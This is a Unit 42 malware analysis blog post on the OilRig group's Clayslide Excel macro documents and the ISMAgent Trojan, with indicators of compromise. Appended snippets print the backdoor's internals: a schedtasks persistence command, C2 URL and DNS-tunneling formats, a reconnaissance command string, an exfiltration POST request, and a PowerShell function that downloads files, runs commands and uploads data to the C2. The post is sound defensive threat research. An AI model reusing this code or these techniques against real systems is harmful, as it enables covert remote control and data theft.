{
    "title": "oilrig uses ismdoor variant_ possibly linked to greenbug threat group",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nOilRig Uses ISMDoor Variant; Possibly Linked to\nGreenbug Threat Group\n26,509\npeople reacted\n0\n14 min. read\nUnit 42 has discovered activity involving threat actors responsible for the OilRig campaign  with a potential link to\na threat group known as GreenBug . Symantec first reported on this group back in January 2017, detailing their\noperations and using a custom information stealing Trojan called ISMDoor.\nIn July 2017, we observed an attack on a Middle Eastern technology organization that was also targeted by the\nOilRig campaign in August 2016. Initial inspection of this attack suggested this was again the OilRig campaign\nusing their existing toolset, but further examination revealed not only new variants of the delivery document we\nnamed Clayslide , but also a different payload embedded inside it. In the past, we had primarily associated the\nOilRig campaign with using the Clayslide documents to deliver as a payload a Trojan we named Helminth; in this\ninstance, the payload was instead a variant of the ISMDoor Trojan with significant modifications which we are\nnow tracking as ISMAgent.\nThe Attack\nOn July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the\ntargeted organization. All of the emails sent had the same subject, attachment filename, and attached Excel file\n(SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6).\nWe identified the Excel file attached to the delivery email as a variant of the Clayslide delivery documents used\nby the OilRig campaign. A closer look revealed that although it was similar to previous Clayslide documents, it was\nalso quite different in several aspects. Like the previous samples, it displays a worksheet titled “Incompatible”\ncontaining a banner that shows a fake compatibility warning message (Figure 1). The message is an attempt to\ntrick the user into clicking the “Enable Content” button, which would run a malicious macro embedded within the\nExcel file\nFigure 1 Incompatible message attempting to trick the victim into enabling macros\nThe macro within the delivery document will unhide and display a new worksheet that contains a fake invoice for\nCitrix products, as seen in Figure 2. This fake invoice acts as a decoy document to minimize the user’s suspicions\nthat any malicious activity occurred.\nFigure 2 Decoy document opened to minimize suspicions of compromise\nWhile the macro displays the decoy invoice spreadsheet, it silently runs malicious code in the background to\ninstall its payload. The malicious code starts by concatenating several base64 encoded strings into a single\nvariable. As you can see in the following code snippet, the variable name “Paltofp1” suggests that the author of\nthis code may want our attention:\nThe macro then writes the concatenated base64 encoded data to the file %PUBLIC%\\Libraries\\B642.txt. It then\nreads in the “B642.txt” file and decodes the data, which it will save to the file\n%PUBLIC%\\Libraries\\servicereset.exe (SHA256:\n52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9). The servicereset.exe file is the\npayload of this attack, which is a variant of ISMDoor that we track as ISMAgent.\nThe script then creates a file named %PUBLIC%\\Libraries\\OfficeServicesStatus.vbs which contains a VBScript\nthat will execute the “servicereset.exe” file using the command line. Lastly, as a persistence mechanism, a\nscheduled task named “OfficeServicesStatus” will be created, set to run every three minutes, as seen in Figure 3.\nFigure 3 Scheduled task created by the macro within the delivery document\nAn Iterative Task\nWhile hunting for other samples similar to the one observed in the attack against the technology organization, we\ndiscovered yet another variant of Clayslide (SHA256:\n5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902). This sample was dated June\n2017, a month older than the newest version containing ISMAgent. Based upon timestamping and similarities\nwith both the original Clayslide documents as well as the newest ISMAgent loaded ones, we believe this June\n2016 sample to be an iterative version of Clayslide.\nThe June 2017 sample of Clayslide contained the same OfficeServicesStatus.vbs file found in the ISMAgent\nClayslide document, but instead of having the payload embedded in the macro as segregated base64 strings that\nwould be concatenated, this variant obtained its payload from multiple cells within the “Incompatible” worksheet.\nThis technique was observed in previous Clayslide documents to access the script variant of the Helminth Trojan\nin earlier OilRig attacks.\nAlso, the June 2017 sample contained artifacts observed in previous Clayslide documents as documented in a\nblog post  we published in April. Specifically, we found this comment:\nalong with the following common function names within the macro code:\nAlthough structurally the document was more similar to the originally discovered Clayslide documents, this June\n2017 sample was designed to load ISMAgent instead of Helminth. We do not have targeting details for this\nsample, although the decoy document contained a similar theme to the newest Clayslide document, displaying\nvendor related information (Figure 4).\nFigure 4 Decoy document\nA table displaying the differences in each variant of Clayslide is below:\nOriginal Clayslide June Clayslide Newest Clayslide\nHelminth X\nISMAgent X X\nOfficeServicesStatus X X\nBase64 in multiple cells X X\nSource code comment X X\nTable 1 Comparison of Clayslide versions\nThe payload (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9) delivered\nin the June 2016 attack is a variant of the recent ISMDoor versions that use DNS tunneling for its C2\ncommunications. On May 1, 2017, Arbor Networks  published research on ISMDoor using DNS tunneling to\ncommunicate with its C2 server, which is nearly identical to the DNS tunneling the payload of this attack carries\nout. Due to considerable differences and evidence of potentially different authors between the previous\nISMDoor samples and this newly discovered variant, we are tracking this new variant as ISMAgent.\nOn‐demand Configuration\nThe ISMAgent tool comes with a default configuration that specifies the C2 domain and the number of minutes\nbetween further attempts to execute the tool. However, an actor can use command line arguments to create a\nnew ISMAgent sample that is configured with a specified C2 domain and a specified number of minutes to\nautomatically execute the Trojan. The following command line arguments are supported:\nArgument Description\n‐c Configures a second domain to use for C2 communications\n‐m Configures the number of minutes that a scheduled task should execute the payload\nTable 2 Command line options available in ISMAgent for configuration\nIf the Trojan is executed with these arguments, the Trojan will read its own file data in, and search for two strings\nof characters within the data that it will overwrite with the configured settings. The Trojan searches for a string of\n“^” characters that it will overwrite with the C2 domain provided via the “‐c” argument, and it searches for the\nstring “%%%%” that it will replace with the number of minutes provided via the “‐m” argument. The “%%%%”\nstring exists within the following larger string, that the Trojan uses as a command to execute in order to create a\nscheduled task named “TimeUpdate” to execute the payload after the specified number of minutes passes:\nCommand and Control\nThe Trojan is able to use two mechanisms to communicate with its C2 server: HTTP requests and DNS tunneling.\nThe DNS tunneling protocol found in this payload is remarkably similar to recent ISMDoor samples, as\ndocumented in Arbor Networks ’ research. Similar message handling is found in both ISMAgent and ISMDoor, in\naddition to the existence of strings in both samples, such the hardcoded IPv6 values. The similarities may allow\nfor backward compatibility between ISMAgent and ISMDoor C2 infrastructure. In the payloads themselves, a\nnumber of differences exist, enough that in essence they appear to be different tools.\nRegardless of the communications method used, the Trojan will parse the received data from the C2 server for a\nGUID field that the Trojan will use as a unique identifier, as well as commands the Trojan should run on the\ncompromised system:\nHTTP C2 Communications\nISMAgent prioritizes HTTP as its mechanism to communicate with the C2 server, but if it is unable to reach the\nC2 server it will switch to the DNS tunneling mechanism. To carry out its HTTP C2 communications, the Trojan\nprepends “www.” to the configured C2 domain and issues a DNS query to resolve this domain. The Trojan will\nuse the resolved IP address as the host in the HTTP beacon request.\nFor instance, the sample used in this attack was configured to use ntpupdateserver[.]com for its C2 server. The\nHTTP C2 process would attempt to resolve the domain “www.ntpupdateserver[.]com”, which resolved to\n142.54.179[.]90, so the Trojan would use the string “http:/w” as the basis of the C2 URL.  The initial beacon sent\nfrom the Trojan to the C2 server using a URL structured in the following way:\nThe C2 server will respond to this request with a command string using the previously mentioned format. During\nthe attack on the technology organization, we observed the C2 server issuing the following command:\nIf the C2 server provides a command to execute on the system, the Trojan executes it using cmd.exe and writes\nthe output to %TEMP%\\runlog[random number].tmp. The Trojan will read this runlog file and send it to the C2\nserver via an HTTP POST request to a URL structured as follows:\nThe HTTP POST request contains an anomalous boundary value of “myboundary” and hardcoded filename value\nof “a.a”, as seen below, which may be used to generate detection signatures for this behavior:\nWhile we did not observe the C2 server attempting to run additional commands via ISMAgent, we were able to\nanalyze the Trojan itself to determine the functionality of its available commands. If the command string contains\na URL to download a file to the system, the Trojan will simply use the URLDownloadToFileA function to download\nand save the file to the target system in the %TEMP% folder. If the C2 server provides a path to a file it wishes to\nupload from the system, the Trojan will open the file, read its contents, and then upload its contents via an HTTP\nPOST to the following URL:\nDNS Tunneling for C2\nISMAgent uses its DNS tunneling technique for C2 as a backup to its HTTP capability. This mechanism supports\nthe same command message structure and even handles the commands in the same manner. The Trojan sends\ndata to the C2 server via DNS queries by encoding data and using the encoded string as a subdomain of an actor\nowned domain. The C2 server can send data to the Trojan by resolving the DNS queries to IPv6 addresses that\nthe Trojan treats as hexadecimal data.\nTo carry out its DNS C2 communications, the Trojan will issue DNS queries to the C2 domain to obtain the AAAA\nrecords associated with the domain. The Trojan starts this process by creating a unique GUID and appending it to\nthe string “n.n.c.” to create a subdomain to query in the following format:\nTo respond to this beacon, the C2 domain’s name server will respond to this query with a hardcoded IPv6 value\nof a67d:0db8:a2a1:7334:7654:4325:0370:2aa3. This value acts as an acknowledgement of the beacon. The\nTrojan will then base64 encode the HTTP C2 URL it was using and will send this data to the C2 by constructing\nand issuing the following DNS query:\nThe Trojan splits up the base64 encoded data across several DNS queries, which we believe the C2 domain’s\nname server pieces together using the supplied sequence numbers. The name server will respond to each of\nthese DNS queries with another hardcoded IPv6 value of a67d:0db8:85a3:4325:7654:8a2a:0370:7334 to notify\nthe Trojan that it has received the data. After all of the data is successfully sent via DNS requests, the Trojan will\nsend a final DNS query that has the following structure to notify the C2 server that it has completed its data\ntransfer:\nAfter notifying the C2 server that the data transfer has completed, the Trojan may issue additional DNS queries\nto notify it is ready to receive data back from the C2 server using the following domain name structure:\nThe DNS server will then respond to these DNS queries with additional IPv6 addresses that the Trojan will treat\nas hexadecimal data as described by Arbor Networks.\nInfrastructure\nThe ISMAgent payload embedded inside the newest variant of Clayslide used the C2 domain\nntpupdateserver[.]com. The primary second‐level domain has no IP resolution, instead relying on\nwww.ntpupdateserver[.]com for resolution then two specific subdomains of ns1.ntupdateserver[.]com and\nns2.ntpupdateserver[.]com as the actual DNS C2 handler. The ISMAgent payload embedded inside the June\nversion used a completely different C2 domain at Microsoft‐publisher[.]com, but used the exact same domain\nname structure. Lastly, we were able to identify a third sample of ISMAgent leveraging another unique C2\ndomain, adobeproduct[.]com.\nFigure 5 Primary C2 domains for ISMAgent\nPivoting from the WHOIS registrant email address of paul.mcalister[at]mail.com revealed four additional highly\nsuspect domains:\nPivoting on the WHOIS phone number we found two additional domains. These are registered with the same\nRegistrar, have the same WHOIS address, but the registrant name “bolips Angelio” and email address\nbolips[at]outlook.com.\nThematically, these domains follow the pattern of ISMAgent and OilRig C2 domain names, abusing typo‐squatting\ntechniques in attempts to appear as legitimate domains. Each of these additional domains had the same structure\nas the three ISMAgent C2 domains, with no IP resolution on the primary second‐level domain containing the\nwww, ns1, and ns2 subdomains. Based off the same registrant email address and domain name structure, it is\nhighly probable these other domains are also part of the ISMAgent infrastructure as C2 servers.\nLastly, we identified another ISMAgent sample using the C2 domain of adobeproduct[.]com, which again fits\nthematically and was also found to have the www, ns1, and ns2 subdomains attached to it.\nThese findings are diagrammed below:\nFigure 6 ISMAgent C2 Infrastructure\nISMAgent vs. ISMDoor\nOn the surface, the ISMAgent payload appears similar to the ISMDoor payload, sharing functionality such as a\nspecific DNS tunneling protocol. However, closer analysis shows there are enough differences between the two\npayloads that justifies tracking ISMAgent as its own tool with its own name.\nFirst, all known ISMDoor payloads using DNS tunneling were created for 64‐bit architectures, while all known\nISMAgent are x86 only. The most recent ISMDoor payloads using DNS tunneling have abandoned HTTP as a C2\ncommunications method compared to earlier ISMDoor samples, whereas ISMAgent uses HTTP as the primary\nmethod and DNS tunneling as a secondary method to communicate with its C2 server.\nAlso, while the DNS tunneling protocol is the same, the messages within the transmitted encoded data differs\ndramatically. After the initial “n.n.c.” beacon, ISMAgent sends the HTTP C2 URL as the data via the DNS tunneling\nprotocol to send a beacon to its C2. During our analysis, we observed the sample used in this attack sending the\nfollowing data immediately after the initial beacon:\nComparatively, ISMDoor sends a much more involved series of messages to the C2 server in order to get a\ncommand. The following is a sequence of messages sent from the ISMDoor Trojan to its C2 server via the DNS\ntunneling protocol, the last message (“M:GAC?”) resulting in a command for the Trojan to run:\nLastly, the commands available within ISMAgent and ISMDoor are very different. As mentioned previously,\nISMAgent has a far more limited, but flexible command set, allowing an adversary to upload and download files, in\naddition to command execution via command prompt. The most recent version of ISMDoor (v 10.0.192 SHA256:\naa52dcaf6df43c6aa872fe0f73725f61e082d32c33fc976741d4eca17679533d) on the other hand, has a more\ncomprehensive yet more rigid command set:\nFrom Helminth to ISMAgent\nDuring our data collection process, we discovered a Clayslide delivery document (SHA256:\nca8cec08b4c74cf68c71a39176bfc8ee1ae4372f98f75c892706b2648b1e7530) from September 2016 containing a\npayload that appeared to be the Helminth script variant as found in other Clayslide documents, but upon further\nexamination was wholly different. The macro within this Clayslide documents obtains a PowerShell script from a\ncell in the “Incompatible” worksheet, much like previous samples. The macro then saves a VBScript to\n%PUBLIC%\\Libraries\\LicenseCheck.vbs to run this PowerShell script every 3 minutes.\nLike the Helminth script variants, this PowerShell script is a malicious payload that uses both HTTP requests and\nDNS tunneling to interact with its C2 server. However, the HTTP requests and the protocol employed to perform\nDNS tunneling differs dramatically from Helminth scripts installed by all other known Clayslide samples. The\nHTTP requests and DNS tunneling protocol found in this PowerShell script are instead identical to ISMAgent.\nThe C2 domain used for this script was mslicensecheck[.]com, which had previously been reported by\nLogRhythm  in their OilRig whitepaper. Interestingly, it was the only domain associated with OilRig that did not\nhave an IP resolution at its second‐level, much like the ISMAgent samples.\nThe “doIt” function within the PowerShell script, seen in Figure 7, is responsible for initiating the C2\ncommunications, as well as parsing the data provided by the C2 server to run the appropriate commands. This\nfunction uses the strings “/action2/”, “/response/” and “/upload/” within the C2 URLs when using HTTP to\ncommunicate with the C2 server. This behavior and these strings were also observed in the ISMAgent C2\nbehavior. The “doIt” function also shows that the C2 server will respond with data structured the same way as\nISMAgent, using “#” as a delimiter and various offsets such as offset 0 used in subsequent requests with the C2,\noffset 2 specifying a URL to download a file from, offset 3 specifying a command to execute using command‐\nprompt, and offset 4 specifying a path to a file to upload to the C2 server.\nFigure 7 The ‘doIt’ function within the PowerShell script handles C2 interaction and functionality\nThe commonalities between this PowerShell script and ISMAgent do not stop there. The HTTP requests to the\nC2 server use the exact same URL structure. For instance, the payload generates a URL using the following line\nof code, which results in a base64 encoded string that contains [hostname/username]:\nAlso, as seen in the code above, the PowerShell script makes sure the base64 encoded data used is safe to use in\nan HTTP URL, by replacing the characters “=”, “/” and “+” characters with hexadecimal equivalent. The ISMAgent\npayloads also performed the exact same replacement, as seen in the portion of code in Figure 8.\nFigure 8 Code within ISMAgent payload that overlaps character replacement HTTP communications functionality within\nPowerShell script\nThe DNS tunneling protocol within the PowerShell script is the same as the ISMAgent payload, which can be\nvisualized by the following beacon sent from the PowerShell script:\nTo facilitate the DNS tunneling functionality, the PowerShell script replaces the “=”, “/” and “+” characters within\nthe base64 data sent to the C2 server within the subdomains of DNS queries. However, DNS queries cannot\ninclude the “%” character, so it uses the following line of code to replace them with “‐“, “‐s‐“ and “‐p‐“ instead:\nThis functionality is again replicated within the ISMAgent payload for its DNS tunneling functionality, as shown in\nFigure 9.\nFigure 9 Code within ISMAgent payload that overlaps character replacement within DNS tunneling functionality within\nPowerShell script\nConclusion\nThe OilRig campaign has repeatedly demonstrated a willingness and desire to be iterative in their toolset, while\nmaintaining some level of similarities over time. In this scenario, we were able to directly observe this type of\nbehavior, while also implement a tool thought to be previously unrelated to OilRig. With the inclusion of\nISMAgent within the OilRig toolset, we are beginning to see stronger relationships between the various\ndocumented groups operating in the Middle East. This region has proven to be a hot bed of espionage motivated\nactivity over the last couple of years, and there appear to be no signs of this changing. As our research continues,\nour goal will be to generate even better understandings of the true extent of the various operations in this region\nand the relationships between them.\nPalo Alto Networks customers are protected and may learn more via the following:\nSamples are classified as malicious by WildFire and Traps prevents their execution\nDomains and IPs have been classified as malicious and IPS signatures generated\nAutoFocus users may learn more via the ISMAgent  and Clayslide  tags\nIndicators of Compromise\nClayslide delivering ISMAgent\n3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6\n5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902\nISMAgent payloads\nbbfc05177e5e29b3c8c4ef0148969d07e6239140da5bff57473c32409e76c070\n52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9\naf4d8604d0cd09b8dc01dbafc33c6d240d356cad366f9917192a2725e0121a0d\nISMAgent C2\nAdobeproduct[.]com\nntpupdateserver[.]com\nmicrosoft‐publisher[.]com\nRelated infrastructure\nMiedafire[.]com\ntatavpnservices[.]com\nchrome‐dns[.]com\nfireeyeupdate[.]com\ncache‐service[.]net\nlevel3‐resolvers[.]net\nMslicensecheck[.]com\n \nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Robert Falcone  and Bryan Lee\nJuly 27, 2017 at 5:00 AM\nCategory: Unit 42\nTags: Clayside , Helminth , OilRig , OilRig attacks\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability1source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html\n1\n2\n3\n4Private Sub Workbook_Open ()\n     Call fireeye_Init\n     Call fireeye_ShowHideSheets\n End Sub\n1cmd /c schtasks  /query /tn TimeUpdate  &gt; NUL 2&gt;&amp;1 || schtasks  /create /sc minute /mo %%%% /tn TimeUpdate  /tr \\\"\\\\\\\"\n1[GUID provided by C2]#command#[URL to download file to system]#[command to execute via cmd.exe]#[path to filename to upload to C2]\n1http://[IP of C2 domain]/action2/[base64 encoded hostname\\username]\n12983b983 -0acd-42db-9d86-0b096af5f369 #command##systeminfo &amp;&amp; ipconfig /all &amp;&amp; net user &amp;&amp; net user /domain &amp;&amp; net group /domain &amp;&amp; tasklist &amp;&amp; net stat -an &amp;&amp; net use#\n1http://[IP of C2 domain]/response/[base64 encoded hostname\\username]/[GUID provided by C2]\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13POST /response /[redacted ]/2983b983 -0acd-42db-9d86-0b096af5f369  HTTP/1.1\n Host: 142.54.179.90\n Content-Type: multipart /form-data; boundary =myboundary\n User-Agent: Firefox\n Content-Length: 3868\n Cache-Control: no-cache\n \n --myboundary\n Content-Type: application /octet-stream;charset=UTF-8\n Content-Disposition : form-data; name=\"file\"; filename =\"a.a\"\n \n \n [output of command prompt]\n1http://[IP of C2 domain]/upload/[base64 encoded hostname\\username]/[GUID provided by C2]\n1\n2n.n.c.[session value based on GUID].[c2 domain]\n (ex: n.n.c.303E5CF0A861479B80E2.ntpupdateserver.com )\n1\n2[base64 encoded data].[iterating sequence number].d.[session value based on GUID].[c2 domain]\n (ex: aHR0cDovLzE0M .0.d.303E5CF0A861479B80E2.ntpupdateserver.com )\n1\n2n.[iterating sequence number].f.[session value based on GUID].[c2 domain]\n (ex: n.8.f.303E5CF0A861479B80E2.ntpupdateserver.com )\n1www.[iterating sequence number].r.[session value based on GUID].[c2 domain]\n1\n2\n3Ntpupdateserver [.]com\n Microsoft -publisher [.]com\n Adobeproduct [.]com\n1\n2\n3\n4fireeyeupdate [.]com \n chrome-dns[.]com\n tatavpnservices [.]com\n miedafire [.]com\n1\n2cache-service[.]net\n level3-resolvers [.]net\n1http://142.54.179[.]90/action2/T0tPODczODAyNTg1NTk4XDVoNkdkTjY5YTR0S0g%3d||\n1\n2\n3\n4\n51. M:CC?\n 2. M:ME?appId=-1&amp;message=Executed Successfully\n 3. M:AV?appId=-1&amp;uniqueId =00000000 -0000-0000-0000-000000000000\n 4. M:AV?appId=[appId provided by C2]&amp;uniqueId =[GUID provided by C2]\n 5. M:GAC?appId=[appId provided by C2]\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16ChangeAliveSeconds\n ChangeAddress\n SI\n GetConfig\n RunNewVersion\n restart\n remove\n FastAlive\n ExecuteKL\n GetVersion\n PauseUpload\n ResumeUpload\n PauseDownload\n ResumeDownload\n PWS\n ImmediateResetRam\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24 function  doIt(){\n  try{\n   while($true){\n    $res = get($ha+\"/action2/\" +$id)\n    $p = $res.split('#')\n    if ($p.Length -lt 5) { break }\n    $res = $tmp+$p[0]\n    $u = $ha+\"/response/\" +$id+\"/\"+$p[0]\n    if ($p[2] -ne '') {\n     $name= $p[2].SubString ($p[2].LastIndexOf (\"/\")+1)\n     download  $p[2] ($tmp+$name)\n     [IO.File]::WriteAllText ($res,\"done\", [System.Text.Encoding ]::Unicode)\n    }\n    if($p[3] -ne ''){\n     $p[3] | cmd.exe &gt;&gt; $res\n    }\n    if($p[4] -ne ''){\n     upload $u.Replace(\"/response/\" ,\"/upload/\" ) $p[4]\n    }\n    upload $u $res \n    [IO.File]::Delete($res)\n   }\n  } catch {}\n }\n1$id=[Convert]::ToBase64String ($Enc.GetBytes ([System.Net.Dns]::GetHostEntry ([string]\"localhost\" ).HostName +\"/\"+$env:username )).Replace\n1n.n.c.55957d20569c43c9a401e5d446b92b9e.mslicensecheck.com\n1$b64=[Convert]::ToBase64String ($dt).Replace('=','-').Replace(\"/\",\"-s-\").Replace(\"+\",\"-p-\")\nSearch Unit 42\nSHARE \n "
}